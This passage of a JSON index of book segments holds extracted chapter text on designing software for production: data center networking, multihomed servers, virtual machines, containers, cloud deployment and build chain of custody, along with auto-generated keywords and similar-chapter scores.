        "Calabrian doctor named",
        "Itty-Bitty Living Space",
        "threads",
        "time",
        "application server",
        "official calendar date",
        "Aloysius Lilius",
        "Calabrian doctor"
      ],
      "concepts": [
        "site",
        "calendar",
        "request",
        "requests",
        "days",
        "day",
        "thanksgiving",
        "threads",
        "pages",
        "paged"
      ],
      "similar_chapters": [
        {
          "book": "Effective-Python",
          "chapter": 17,
          "title": "Segment 17 (pages 165-174)",
          "relevance_score": 0.41,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Distilled",
          "chapter": 2,
          "title": "Segment 2 (pages 9-18)",
          "relevance_score": 0.39,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Distilled",
          "chapter": 12,
          "title": "Segment 12 (pages 100-107)",
          "relevance_score": 0.39,
          "method": "sentence_transformers"
        },
        {
          "book": "Python Microservices Development",
          "chapter": 1,
          "title": "Segment 1 (pages 1-8)",
          "relevance_score": 0.39,
          "method": "sentence_transformers"
        },
        {
          "book": "Effective-Python",
          "chapter": 1,
          "title": "Segment 1 (pages 2-9)",
          "relevance_score": 0.37,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 19,
      "title": "Segment 19 (pages 147-156)",
      "start_page": 147,
      "end_page": 156,
      "detection_method": "topic_boundary",
      "content": "Winding Down • 139\n\nDynamically reconfiguring and restarting just the connection pool took less than five minutes (once we knew what to do.)\n\nAlmost immediately after my scripts finished, we saw user traffic getting through. Page latency started to drop. About ninety seconds later, the DRPs went green in SiteScope. The site was back up and running.\n\nWinding Down\n\nI wrote a new script that would do all the actions needed to reset that connec- tion pool’s maximum. It set the max property, stopped the service, and then restarted the service. With one command, an engineer in the operations center or in the “command post” (that is, the conference room) at the client’s site could reset the maximum connections to whatever it needed to be. I would later learn that script was used constantly through the weekend. Because setting the max to zero completely disabled home delivery, the business sponsor wanted it increased when load was light and decreased to one (not zero) when load got heavy.\n\nWe closed out the call. I hung up and went to tuck my kids into bed. It took a while. They were full of news about going to the park, playing in the sprin- kler, and seeing baby rabbits in the backyard. I wanted to hear all about it.\n\nreport erratum • discuss\n\nCHAPTER 7\n\nFoundations\n\nIn the last chapter, the operations team, my client, and I narrowly avoided a financial disaster. It was a difficult situation, and the “solution” was not exactly ideal. All of us would have been happier if it’d never happened. My team couldn’t fix the underlying problem—the delivery scheduling servers were outside our control. But I was able to diagnose the problem, and the operations center partially mitigated its effects. That was only possible because we already had good visibility into the running system. There certainly wasn’t time to add a bunch of logging calls inside the application. With runtime vis- ibility, though, new logging wasn’t necessary. The applications revealed their problems. To apply the solution, we exercised control over the running system. There’s no way we could have recovered if we’d had to reboot the servers after every configuration change.\n\nThe next few chapters cover those key ingredients, leading us to a concept of “design for production.” Design for production means thinking about produc- tion issues as first-class concerns. That includes the production network, which might be considerably different from your development environment. It also includes logging and monitoring, runtime control, and security. Design for production also means designing for the people who do operations, whether they are a dedicated ops team or integrated with development. Operators are users, too. They may not be logged in to a beautifully designed front-end application, but they get to interact with your system through its configuration, control, and monitoring interfaces. If your system’s front end is Disney World, then operators get to use the secret tunnels beneath the park.\n\nIn the next several chapters, we will work through layers of concerns. As you can see in the figure on page 142, everything starts with the physical infras- tructure. We’ll discuss that in this chapter. The next chapters each zoom out one step at a time to encompass wider, more distributed concerns as we go.\n\nreport erratum • discuss\n\nChapter 7. Foundations • 142\n\nFoundationHardware, VMs, IP addresses, physical network\n\nInstancesServices, processes, components, instance monitoring\n\nInterconnectRouting, load balancing, failover, traﬃc management\n\nControl PlaneSystem monitoring, deployment, anomaly detection, features\n\nOperationsSecurity, availability, capacity, status, communication\n\nYou may notice that the words “as a service” don’t appear anywhere in the dia- gram above. The distinctions between “Infrastructure as a Service” and “Platform as a Service” were never strong to begin with. As vendors have sliced, diced, and triangulated their way across the landscape, those classifications have broken down completely. It’s more useful to look at different technology platforms in terms of those layers of responsibility: Which layers do they drive/does the platform drive completely by API? Which responsibilities move from operations to developers, and in which layers? What responsibilities remain application- level concerns and what is moved behind software-driven abstractions?\n\nThis chapter starts with the first layer. Operations leads us into design for production considerations by looking at the physical fundamentals of the sys- tem: the machines and wires that everything else builds upon. The first order of business is to clear up some things about networks, hostnames, and IP addresses. After that, it’s time to talk about the code holders: physical hosts, virtual machines, and containers. Each kind of deployment has its own set of concerns that software designs must account for. Finally, we’ll look at some special concerns that arise when a system spans multiple data centers.\n\nNetworking in the Data Center and the Cloud\n\nNetworking in the data center and the cloud takes more than opening a socket. These networks incorporate more redundancy and security than desktop networks. Add in a layer or two of virtualization, and applications and services can behave very differently than they do in the safe confines of the IDE. They require some additional work to behave properly in this environment.\n\nreport erratum • discuss\n\nNetworking in the Data Center and the Cloud • 143\n\nNICs and Names\n\nOne of the great misunderstandings in networking is about the hostname of a machine. That’s because hostname can be defined in two distinct ways. First, a hostname is the name an operating system uses to identify itself. This is what you see when you run the “hostname” command. The administrator of the machine can set that hostname and the “default search domain.” Together, the concatenation of the hostname and search domain is called the fully qualified domain name (FQDN.)\n\nThe second definition of hostname pertains to the external name of the system. Other computers expect to connect to the target machine using that hostname. When a program tries to connect to a particular hostname, it resolves that name via DNS. DNS resolves the desired name, maybe through a recursive query up to higher authorities, and ultimately returns an IP address.\n\nDid you spot the discrepancy? There’s no guarantee that the machine’s own FQDN matches the FQDN that DNS has for its IP address. In other words, a machine may have its FQDN set to “spock.example.com” but have a DNS mapping as “mail.example.com” and “www.example.com.” The fundamental disconnect is that a machine uses its hostname to identify the whole machine, while a DNS name identifies an IP address. Multiple DNS names can resolve to the same IP address. For load-balanced services, a DNS name can also resolve to multiple IP addresses. That means “DNS name to IP address” is a many-to- many relationship. But the machine still acts as if it has exactly one hostname. Many utilities and programs assume that the machine’s self-assigned FQDN is a legitimate DNS name that resolves back to itself. This is largely true for development machines and largely untrue for production services.\n\nThere’s another many-to-many relationship in the mix as well. A single machine may have multiple network interface controllers (NICs.) If you run “ifconfig” on a Linux or Mac machine, or “ipconfig” on a Windows machine, you’ll probably see several NICs listed. Each NIC can be attached to a different network. Each active NIC gets an IP address on its particular network. This is called multihoming. Nearly every server in a data center will be multihomed.\n\nA dev box usually has multiple NICs for the sake of mobility. One will be a wired Ethernet port (for those desktops or laptops that have wired Ethernet). Another NIC will be for Wi-Fi. Both of those have physical hardware handling them. A loopback NIC is a virtual device. It handles good old 127.0.0.1.\n\nData center machines are multihomed for different purposes. They enforce security by separating administration and monitoring onto a different network. They may improve performance by segmenting high-volume traffic, such as\n\nreport erratum • discuss\n\nChapter 7. Foundations • 144\n\nbackups, away from the production traffic. These networks have different security requirements, and an application that is not aware of the multiple network interfaces will easily end up accepting connections from the wrong networks. For example, it could accept administrative connections from the production network or offer production functionality over the backup network.\n\nAs shown in the following figure, this single server has four different network interfaces. The Unix convention is to use the driver type followed by a digit. In Linux, these would be eth0 through eth3. For Solaris, they could be ce0 through ce3 or qfe0 through qfe3, depending on the network card and driver version. Win- dows would give the interfaces incredibly long and unwieldy names by default.\n\nServer\n\nSwitch 1\n\nSwitch 2\n\nBackupSwitch\n\nAdminSwitch\n\nnic0nic1nic2nic3172.16.64.190172.16.32.19010.10.1.190192.168.104.190\n\nOf the four interfaces, two of them are dedicated to “production” traffic. These handle the application’s functionality. If the server is a web server, then these handle the incoming requests and send the replies back. In this example, both interfaces are for production traffic. Because these are running to differ- ent switches, the server appears to be configured for high availability. These two interfaces might be load balanced, or they might be set up as a failover pair. As shown, two different IP addresses will get packets to this server. That means there are probably DNS entries for both addresses. In other words, this machine has more than one name! It has its own internal hostname— the string returned by the hostname command—but from the outside, more than one name reaches this host.\n\nAnother common configuration for multiple production interfaces is bonding, or teaming. In this configuration, both interfaces share a common IP address.\n\nreport erratum • discuss\n\nNetworking in the Data Center and the Cloud • 145\n\nThe operating system ensures that an individual packet goes out over only one interface. Bonded interfaces can be configured to automatically balance outbound traffic or to prefer one link or the other. Bonded interfaces that connect to different switches require some additional configuration on the switches, or else routing loops can result. You’ll certainly be famous if you cause a routing loop in the data center, but not in a good way.\n\nThe two additional “back-end” interfaces are dedicated to special-purpose traffic. Because backups transfer huge volumes of data in bursts, they can clog up a production network. Therefore, good network design for the data center partitions the backup traffic onto its own network segment. These are sometimes handled by separate switches and sometimes just by separate VLANs on the production switches. With backup traffic partitioned off from the production network, application users don’t necessarily suffer when the backups run. (They might, if the server doesn’t have enough I/O bandwidth to process backups and application traffic at the same time. Nevertheless, users of other applications don’t suffer when this server is being backed up.)\n\nFinally, many data centers have a specific network for administrative access. This is an important security protection, because services such as SSH can be bound only to the administrative interface and are therefore not accessible from the production network. This can help if a firewall gets breached by an attacker or if the server handles an internal application and doesn’t sit behind a firewall.\n\nProgramming for Multiple Networks\n\nThis multitude of interfaces affects the application software. By default, an application that listens on a socket will listen for connection attempts on any interface. Language libraries always have an “easy” version of listening on a socket. The easy version just opens a socket on every interface on the host. Bad news! Instead, we have to do it the hard way and specify which IP address we are opening the socket for:\n\n// Bad approach ln, err := net.Listen(\"tcp\", \":8080\")\n\n// Good approach ln, err := net.Listen(\"tcp\", \"spock.example.com:8080\")\n\nTo determine which interfaces to bind to, the application must be told its own name or IP addresses. This is a big difference with multihomed servers. In development, the server can always call its language-specific version of getLocal- Host(), but on a multihomed machine, this simply returns the IP address associ- ated with the server’s internal hostname. This could be any of the interfaces,\n\nreport erratum • discuss\n\nChapter 7. Foundations • 146\n\ndepending on local naming conventions. Therefore, server applications that need to listen on sockets must add configurable properties to define to which interfaces the server should bind.\n\nOutbound Connections\n\nUnder exceedingly rare conditions, an application also has to specify which interface it wants traffic to leave from when connecting to a target IP address. For production systems, I would regard this as a configuration error in the host: it means multiple routes reach the same destination, hooked to different NICs.\n\nThe exception is when two NICs connected to two switches are bonded into a single interface. Suppose “en0” and “en1” are connected to different switches, but also bonded as “bond0.” Without any additional guidance, an application opening an outbound connection won’t know which interface to use. The solution is to ensure that the routing table has a default gateway using “bond0.”\n\nWith that under our belts, we now have enough networking knowledge to talk about the hosts and the layers of virtualization on them.\n\nPhysical Hosts, Virtual Machines, and Containers\n\nAt some level, all machines are the same. Eventually, all our software runs on some piece of precisely patterned silicon. All our data winds up on glass platters of spinning rust or encoded in minute charges on NAND gates. That’s where the similarity ends. A bewildering array of deployment options force us to think about the machines’ identities and lifespans. These aren’t just packaging issues, either. A design that works nicely in a physical data center environment may cost too much or fail utterly in a containerized cloud envi- ronment. In this section, we’ll look at these deployment options and how they affect software architecture and design for each kind of environment.\n\nPhysical Hosts\n\nThe CPU is one place where the data center and the development boxes have converged. Pretty much everything these days runs a multicore Intel or AMD x86 processor running in 64-bit mode. Clock speeds are pretty much the same, too. If anything, development machines tend to be a bit beefier than the average pizza box in the data center these days. That’s because the story in the data center is all about expendable hardware.\n\nThis is a huge shift from just ten years ago. Before the complete victory of commodity pricing and web scale, data center hardware was built for high reliability of the individual box. Our philosophy now is to load-balance services\n\nreport erratum • discuss\n\nPhysical Hosts, Virtual Machines, and Containers • 147\n\nacross enough hosts that the loss of a single host is not catastrophic. In that environment, you want each host to be as cheap as possible.\n\nThere are two exceptions to this rule. Some workloads require large amounts of RAM in the box. Think “graph processing” rather than ordinary HTTP request/response applications. The other specialized workload is GPU com- puting. Some algorithms are “embarrassingly parallel,” so it makes sense to run them across thousands of vector-processing cores.\n\nData center storage still comes in a bewildering variety of forms and sizes. Most of the useful storage won’t be directly on the individual hosts. In fact, your development machine probably has more storage than one of your data center hosts will have. The typical data center host has enough storage to hold a bunch of virtual machine images and offer some fast local persistent space. Most of the bulk space will be available either as SAN or NAS. Don’t be fooled by the similarity in those acronyms. Bloody trench wars have been fought between the two camps. (It’s easier to make trenches in a data center than you might think. Just pop up a few raised floor panels.) To an application running on the host, though, both of them just look like another mount point or drive letter. Your application doesn’t need to care too much about what protocol the storage speaks. Just measure the throughput to see what you’re dealing with. Bonnie 64 will give you a reasonable view with a minimum of fuss.1\n\nAll in all, the picture is much simpler today than it once was. Design for produc- tion hardware for most applications just means building to scale horizontally. Look out for those specialized workloads and shift them to their own boxes. For the most part, however, our applications won’t be running directly on the hardware. The virtualization wave of the early 2000s left no box behind.\n\nVirtual Machines in the Data Center\n\nVirtualization promised developers a common hardware appearance across the bewildering array of physical configurations in the data center. It promised data center managers that it would rein in “server sprawl” and pack all those extra web servers running at 5 percent utilization into a high-density, high- utilization, easily managed whole. Guess which story turned out to be more compelling?\n\nOn the down side, performance is much less predictable. Many virtual machines can reside on the same physical hosts. It’s rare to see VMs move from one host to another, because it’s disruptive to the guest. (The “host\n\n1.\n\nhttps://sourceforge.net/projects/bonnie64\n\nreport erratum • discuss\n\nChapter 7. Foundations • 148\n\noperating system” is the one that really runs on hardware. It provides the virtualization features. “Guest operating systems” run in the virtual machines.) Physical hosts are usually oversubscribed. That means the physical host may have 16 cores, but the total number of cores allocated to VMs on the host is 32. That host would be 200 percent subscribed or 100 percent oversubscribed. If all those applications receive requests at the same time, just through random chance, then there’s not enough CPU to go around.\n\nAlmost any resource on the host can be oversubscribed, especially CPU, RAM, and network. Regardless of resource, the result is always the same: contention among VMs and random slowdowns for all. It’s virtually impossible for the guest OS to monitor for this.\n\nWhen designing applications to run in virtual machines (meaning pretty much all applications today) you must make sure that they’re not sensitive to the loss or slowdown of any one host. That’s just a good idea anyway, but it’s particularly important here. Here are some things to watch out for:\n\nDistributed programming techniques that require synchronous responses\n\nfrom the whole cluster for work to proceed\n\n“Special” machines like cluster managers or lock managers, unless\n\nanother machine can take over without reconfiguration\n\nSubtle dependency on request or event ordering—nobody designs this\n\ninto a system, but it can creep in unexpectedly.\n\nVirtual machines make all the problems with clocks much worse. Most pro- grammers carry a mental model of the clock as being monotonic and sequential. That is, a program that samples the system clock may get the same value twice but it’ll never get a value less than a prior response. It turns out that’s not even true for a clock on a physical machine. But on a virtual machine it can be much worse. Between two calls to examine the clock, the virtual machine can be suspended for an indefinite span of real time. It might even be migrated to a different physical host that has a clock skew relative to the original host. A clock on a virtual machine is not necessarily monotonic or sequential. The virtualization tools try to paper over this with a little com- munication from the VM to query the host so the VM can update its OS clock whenever it wakes up. That keeps the VM’s OS clock synced with the host’s OS clock. From an application perspective, this makes the clock jump around even more. The bottom line is: don’t trust the OS clock. If external, human time is important, use an external source like a local NTP server.\n\nreport erratum • discuss\n\nPhysical Hosts, Virtual Machines, and Containers • 149\n\nContainers in the Data Center\n\nContainers have invaded the data center, pushed there by developer insistence. Containers promise to deliver the process isolation and packaging of a virtual machine together with a developer-friendly build process. The container hypothesis says, “I’ll never again have to ask if production matches QA.”\n\nContainers in the data center act a lot like virtual machines in the cloud (see Virtual Machines in the Cloud, on page 152). Any individual container only has a short-lived identity. As a result, it should not be configured on a per-instance basis. This can cause interesting effects with older monitoring systems (looking at you, Nagios!) that need to be reconfigured and bounced every time a machine is added or removed.\n\nA container won’t have much, if any, local storage, so the application must rely on external storage for files, data, and maybe even cache.\n\nThe most challenging part of running containers in the data center is definitely the network. By default, a container doesn’t expose any of its ports (on its own virtual interface) on the host machine. You can selectively forward ports from the container to the host, but then you still have to connect them from one host to another. One common pattern that’s developing is the overlay network. This uses virtual LANs (VLANs)—see Virtual LANs for Virtual Machines, on page 150 —to create a virtual network just among the containers. The overlay network has its own IP address space and does its own routing with software switches running on the hosts. Within the overlay network, some control plane software manages the whole ensemble of containers, VLANs, IPs, and names.\n\nA close second for “hardest problem in container-world” is making sure enough container instances of the right types are on the right machines. Containers are meant to come and go—part of their appeal is their very fast startup time (think milliseconds rather than minutes). But that means container instances will be like quantum foam burbling across all your hosts. Manually operating containers would be absurd. Instead, we delegate that job to another bit of control plane software. We describe our desired load out of the containers, and the software spreads container meringue across the physical hosts. The control software should know something about the geographic distribution of the hosts as well. That way it can allocate instances regionally for low latency while maintaining availability in case you lose a data center.\n\nIt seems natural that the same software should schedule container instances and manage their network settings, right? Solutions for running containers in data centers are emerging. None are dominant at this time, but packages like Kubernetes, Mesos, and Docker Swarm are attacking both the networking\n\nreport erratum • discuss",
      "page_number": 147,
      "chapter_number": 19,
      "summary": "This chapter covers segment 19 (pages 147-156). Key topics include network, application, and applications. Numerous proposals were thrown up and shot down, generally because the application code’s behavior under those circumstances was unknown.",
      "keywords": [
        "Data Center",
        "newspapers Friday morning",
        "hit newspapers Friday",
        "data",
        "center",
        "machine",
        "Data center machines",
        "network",
        "interfaces",
        "application",
        "production",
        "data center hosts",
        "server",
        "production network",
        "Friday morning"
      ],
      "concepts": [
        "network",
        "application",
        "applications",
        "interfaces",
        "machines",
        "centered",
        "center",
        "servers",
        "traffic",
        "runs"
      ],
      "similar_chapters": [
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 60,
          "title": "Segment 60 (pages 591-598)",
          "relevance_score": 0.54,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservices Up and Running",
          "chapter": 9,
          "title": "Segment 9 (pages 86-94)",
          "relevance_score": 0.54,
          "method": "sentence_transformers"
        },
        {
          "book": "operating_systems_three_easy_pieces",
          "chapter": 58,
          "title": "Segment 58 (pages 592-602)",
          "relevance_score": 0.52,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 59,
          "title": "Segment 59 (pages 583-590)",
          "relevance_score": 0.51,
          "method": "sentence_transformers"
        },
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 2,
          "title": "Segment 2 (pages 9-17)",
          "relevance_score": 0.5,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 20,
      "title": "Segment 20 (pages 157-165)",
      "start_page": 157,
      "end_page": 165,
      "detection_method": "topic_boundary",
      "content": "Chapter 7. Foundations • 150\n\nVirtual LANs for Virtual Machines\n\nAs if there weren’t enough ways for a packet to hit a pocket on a socket on a port, we’ve got virtual LANs (VLANs) and virtual extensible LANs (VXLANs) to contend with. The idea of a VLAN is to multiplex Ethernet frames on a single wire but let the switch treat them like they came in from totally separate networks. The VLAN tag is a number from 1 to 4,094 that nestles into the physical routing portion of the header. Every network you encounter will support VLANs.\n\nThe operating system that runs a NIC can create a virtual device assigned to a virtual LAN. Then all the packets sent by that device will have that VLAN ID in them. That also means the virtual device must have its own IP address in a subnet assigned to that VLAN.\n\nVXLAN takes the same idea but runs it at “layer 3,” meaning it’s visible to IP on the host. It also uses 24 more bits in the IP header, so a physical network can have more than 16 million VXLANs riding its wires.\n\nAt one time this was all the province of network engineers pulling cables around the data center. Virtualization and containers increasingly rely on software switches to handle dynamic updates. It will be common to see software switches running on the hosts, presenting a complete network environment to the containers that does the following:\n\nAllows containers to “believe” they’re on isolated networks • Supports load-balancing via virtual IPs • Uses a firewall as a gateway to the external network\n\nWhile this technology matures, our container systems have to provide their own load- balancing and need to be told which IP addresses and ports their peers are on.\n\nand allocation problem. Whichever one solves this problem first will be able to truly claim the title of “operating system for the data center.”\n\nWhen you design an application for containers, keep a few things in mind. First, the whole container image moves from environment to environment, so the image can’t hold things like production database credentials. Creden- tials all have to be supplied to the container. A 12-factor app handles this naturally. If you’re not using that style, think about injecting configuration when starting the container. In either case, look into password vaulting.\n\nThe second thing to externalize is networking. Container images should not contain hostnames or port numbers. Again, that’s because the setting needs to change dynamically while the container image stays the same. Links between containers are all established by the control plane when starting them up.\n\nreport erratum • discuss\n\nPhysical Hosts, Virtual Machines, and Containers • 151\n\nThe 12-Factor App\n\nOriginally created by engineers at Heroku, the 12-factor app is a succinct description of a cloud-native, scalable, deployable application.a Even if you’re not running in a cloud, it makes a great checklist for application developers.\n\nThe “factors” identify different potential impediments to deployment, with recommend- ed solutions for each:\n\nCodebase\n\nTrack one codebase in revision control. Deploy the same build to every environment.\n\nDependencies\n\nExplicitly declare and isolate dependencies.\n\nConfig\n\nStore config in the environment.\n\nBacking services\n\nTreat backing services as attached resources.\n\nBuild, release, run\n\nStrictly separate build and run stages.\n\nProcesses\n\nExecute the app as one or more stateless processes.\n\nPort binding\n\nExport services via port binding.\n\nConcurrency\n\nScale out via the process model.\n\nDisposability\n\nMaximize robustness with fast startup and graceful shutdown.\n\nDev/prod parity\n\nKeep development, staging, and production as similar as possible.\n\nLogs\n\nTreat logs as event streams.\n\nAdmin processes\n\nRun admin/management tasks as one-off processes.\n\nSee the website for greater detail on each of these recommendations.\n\na.\n\nhttps://12factor.net\n\nreport erratum • discuss\n\nChapter 7. Foundations • 152\n\nContainers are meant to start and stop rapidly. Avoid long startup or initial- ization sequences. Some production servers take many minutes to load refer- ence data or to warm up caches. These are not suited for containers. Aim for a total startup time of one second.\n\nFinally, it’s notoriously hard to debug an application running inside a con- tainer. Just getting access to log files can be a challenge. Don’t even bother trying to figure out why some socket is being held open for too long. Con- tainerized applications, even more than ordinary ones, need to send their telemetry out to a data collector.\n\nVirtual Machines in the Cloud\n\nAt the time of writing, Amazon Web Services is far and away the dominant cloud platform. Google Cloud is gaining traction thanks to an attractive pricing model, but it has a long way to go before its workload approaches AWS. The world can change pretty quickly, though. While advanced cloud features definitely help with lock-in, compute and storage capacity is more fungible.\n\nIt’s evident now that traditional applications can run in the cloud. No matter what we say about “lift and shift” efforts, they do run. Despite that, a cloud native system will have better operational characteristics, especially in terms of availability and cost.\n\nAny individual virtual machine in the cloud has worse availability than any individual physical machine (assuming equally skilled data center engineering and operations). If you think about it in terms of “moving parts,” you’ll see why that has to be the case. A virtual machine in the cloud runs atop a physical host, but with an extra operating system in the middle. It can be started or stopped without notice by the management APIs (in other words, the “control plane” software.) It also shares the physical host with other vir- tual machines and may contend for resources. If you’ve been running in AWS for any length of time, you’ll have encountered virtual machines that got killed for no apparent reason. If you have long-running virtual machines, you may even have gotten a notice from AWS informing you that the machine has to be restarted (or else!).\n\nAnother factor that presents a challenge to traditional applications is the ephemeral nature of machine identity. A machine ID and its IP address are only there as long as the machine keeps running. Most traditional application configurations keep hostnames or IP addresses in config files. But in AWS, a VM’s IP address changes on every boot. If your application needs to keep\n\nreport erratum • discuss\n\nWrapping Up • 153\n\nthose addresses in files, then you have to rent Elastic IP addresses from Amazon. That works well enough until you need a lot of them. A basic AWS account has a limit on how many addresses it can procure.\n\nThe general rule is that VMs have to “volunteer” to do work, rather than having a controller dole the work out. That means a new VM should be able to start up and join whatever pool of workers handles load. For HTTP requests, autoscaling and load balancers (either elastic load balancers or application load balancers) are the way to go. For asynchronous load, use competing consumers on a queue.\n\nWhen it comes to network interfaces on those cloud VMs, the default is pretty simple: one NIC with a private IP address. This isn’t always what you want, though. There’s a limit to how much traffic a single NIC can support, based on the number of sockets available. Socket numbers only range from 1 to 65535, so at best a single NIC can support about 64,000 connections. You may want to set up more production NICs just to handle more simultaneous connections. Another good reason to set up another NIC is for monitoring and management traffic. In particular, it’s a bad idea to have SSH ports available on front-end NICs for every server. It’s better to set up a single entry point (a “bastion” or “jumphost” server) with strong logging on SSH connections and then use the private network to get from there to other VMs.\n\nNetworking these VMs together presents its own set of challenges and solutions.\n\nContainers in the Cloud\n\nContainers on cloud VMs combine the challenges of both containers and the cloud. The containers have short-lived, ephemeral identities. Connecting them means linking ports across different VMs, possibly in different zones or regions. Designing individual services to run in this kind of deployment is not that much different from designing them to run in containers in the data center. Most of the big challenges arise from building those containers into a whole system. In a sense, using containers pushes some complexity out of the boxes and into the control plane. (We’ll look at the control plane in Chapter 10, Control Plane, on page 193.)\n\nWrapping Up\n\nThe range of deployment environments has widened thanks to cloud comput- ing and platform-as-a-service offers. These environments move the boundary of responsibility back and forth between application development, platform\n\nreport erratum • discuss\n\nChapter 7. Foundations • 154\n\ndevelopment, operations, and infrastructure. Despite that, some considerations are common to every kind of environment:\n\nHow is the network structured? Is there just one or are there several?\n\nWill a machine have NICs on different networks with different jobs?\n\nDo machines have long-lasting identities?\n\nAre machines automatically set up and torn down? If so, how do we\n\nmanage the images for them?\n\nFinding or building the answer to these questions never appears on a Kanban board or a Jira ticket, but they’re essential to making a smooth transition to operations.\n\nGiven a stable foundation to build upon, we need to look at how individual machine instances in that environment will behave and how we will control them. We’ll look at those issues in the next chapter.\n\nreport erratum • discuss\n\nCHAPTER 8\n\nProcesses on Machines\n\nIn the last chapter, we looked at a diverse set of network and physical envi- ronments that our software may be deployed into. In this chapter, we’re going to focus on the individual instances. They need to be good citizens by providing transparency, accepting control, handling configuration nicely, and managing connections. We’ll see some natural overlap with the stability patterns from Chapter 5, Stability Patterns, on page 91, since it’s the job of each instance to accept stress and insults with tolerance and grace.\n\nIn the car business, they say the engine needs fuel, fire, and air to work. Our version of that is code, config, and connection. Every machine needs the right code, configuration, and network connections. One problem we’re going to run into is that our vocabulary hasn’t really kept up with our technology. For instance, when some people say “server” they might mean a virtual machine running on a physical host in their data center. Others might mean a process inside an operating system, rather than a whole machine image. Technology like containers blur the lines further. A process in a container is also a process on the operating system that hosts the container. Which one should we call the “server?” At the risk of seeming hopelessly pedantic, we’ll try to agree on some terms that may help disambiguate the rest of this section.\n\nService\n\nA collection of processes across machines that work together to deliver a unit of functionality. A service may have processes from multiple executables (for example, application code plus a database). One service may present a single IP address with load balancing behind the scenes. (More on that in Chapter 9, Interconnect, on page 171.) On the other hand, it may have multiple IP addresses using the same DNS name.\n\nInstance An installation on a single machine (container, virtual, or physical) out of a load-balanced array of the same executable. A service can be made of multiple different types of executables, but when we talk about\n\nreport erratum • discuss\n\nChapter 8. Processes on Machines • 156\n\ninstances we refer to processes of the same executable, just running in multiple locations.\n\nExecutable An artifact that a machine can launch as a process and created by a build process. In a compiled language, this will be a binary, whereas an interpreted language will include sources. For simplicity, “executable” also covers shared libraries that need to be installed before execution.\n\nProcess\n\nAn operating system process running on a machine; the runtime\n\nimage of an executable.\n\nInstallation\n\nThe executable and any attendant directories, configuration\n\nfiles, and other resources as they exist on a machine.\n\nDeployment\n\nThe act of creating an installation on a machine. Should be\n\nautomated, with the deployment definition kept in source control.\n\nTo make this more concrete, take a look at the “Loan Request” service shown in the following deployment illustration.\n\nSourceRepository\n\nDeployPipeline\n\nProductionConﬁgs\n\nPackageRepository\n\nMachines\n\nInstallation\n\nbuild\n\ndeploy\n\nIn the deployment view, we’re concerned about transforming sources into binaries and binaries into deployments. This involves moving files around. The build process compiles the source code into binary executables that go into the package repository. As a build progresses through the deployment pipeline, various stages tag the build as having passed. If the build makes it all the way through the pipeline, the very same tagged binary gets laid down as an installation on each machine. All these files are inert during deployment. Now let’s look at the runtime view, shown in the figure on page 157.\n\nIn the runtime view, we’re more concerned with the processes running on the machines. (By the way, a lot of architectural confusion stems from attempts to cram both static and dynamic views into the same figure.) Each machine runs an instance of the same binary: our compiled service. Those instances\n\nreport erratum • discuss\n\nCode • 157\n\nMachine\n\nMachine\n\nInstance\n\nMachine\n\nInstance\n\nMachine\n\nInstance\n\nMachine\n\nhaproxy\n\nMachine\n\nhaproxy\n\n10.10.128.19 10.10.128.20\n\nInstance\n\nall sit behind an HAProxy load balancer with the address 10.10.128.19 bound to the DNS name loanrequest.example.com.\n\nThese definitions may seem persnickety, but teams have been bitten when dif- ferent people use the same word for different things. Precise communication is especially important when dealing with operations. If you tell someone to “reboot the server,” you might not know which server they’re about to bounce, and you can’t be sure whether they’re going to kill a single process or the whole machine.1\n\nNow we can turn our attention to the code, config, and connection the instances require.\n\nCode\n\nEven before we get to questions about containers versus VM images, we should look at some things about the code.\n\nBuilding the Code\n\nDevelopers naturally pay a lot of attention to their code. As a result, we have great tools at our disposal to build, house, and deploy code. There are some important rules to follow, though. These are mostly about making sure that you know exactly what goes into the code on the instance. It is vital to establish a strong “chain of custody” that stretches from the developer through\n\n1.\n\nhttps://theagileadmin.com/2017/01/03/loose-lips-sink-ships-precision-in-language\n\nreport erratum • discuss\n\nChapter 8. Processes on Machines • 158\n\nto the production instance. It must be impossible for an unauthorized party to sneak code into your system.\n\nIt starts at the desktop. Developers should work on code within a version control system. There’s simply no excuse not to use version control today. Only the code goes into version control, though. Version control doesn’t handle third-party libraries or dependencies very well.\n\nDevelopers must be able to build the system, run tests, and run at least a portion of the system locally. That means build tools have to download dependencies from somewhere to the dev box. The default would be to download libraries from the Internet. (The standard joke for Maven users is that Maven downloads half of the Internet to run a build.)\n\nDownloading dependencies from the Internet is convenient but not safe. It’s far too easy for one of those dependencies to silently be replaced, either though a man-in-the-middle attack or by compromising the upstream repository. Even if you download dependencies from the Net to start with, you should plan on moving to a private repository as soon as possible. Only put libraries into the repository when their digital signatures match published information from the upstream provider.\n\nDon’t forget about plugins to the build system, either. A colleague who asked not to be named described an attempt to subvert his company’s product in order to attack one of its enterprise customers. That attack was introduced via a compromised Jenkins plugin.\n\nDevelopers should not do production builds from their own machines. Developer boxes are hopelessly polluted. We install all kinds of junk on these systems. We play games and visit sketchy websites. Our browsers get loaded up with slimy toolbars and bogus “search enhancers” like any other human user does. Only make production builds on a CI server, and have it put the binary into a safe repository that nobody else can write into.\n\nImmutable and Disposable Infrastructure\n\nConfiguration management tools like Chef, Puppet, and Ansible are all about applying changes to running machines. They use scripts, playbooks, or recipes (each has their own jargon) to transition the machine from one state to a new state. After each set of changes, the machine should be fully described by the latest scripts, as shown in the figure on page 159.\n\nThe “layers of stucco” approach has two big challenges. First, it’s easy for side effects to creep in that are the result of, but not described by, the recipes. For\n\nreport erratum • discuss",
      "page_number": 157,
      "chapter_number": 20,
      "summary": "It provides the virtualization features Key topics include containers, machines, and virtual.",
      "keywords": [
        "virtual machines",
        "virtual",
        "machine",
        "Containers",
        "host",
        "Data Center",
        "cloud",
        "network",
        "virtual machine running",
        "physical host",
        "Physical",
        "Data",
        "virtual LANs",
        "Virtual machines make",
        "individual virtual machine"
      ],
      "concepts": [
        "containers",
        "machines",
        "virtual",
        "virtually",
        "network",
        "runs",
        "run",
        "running",
        "applications",
        "application"
      ],
      "similar_chapters": [
        {
          "book": "Generative AI with LangChain_2e",
          "chapter": 46,
          "title": "Segment 46 (pages 390-397)",
          "relevance_score": 0.54,
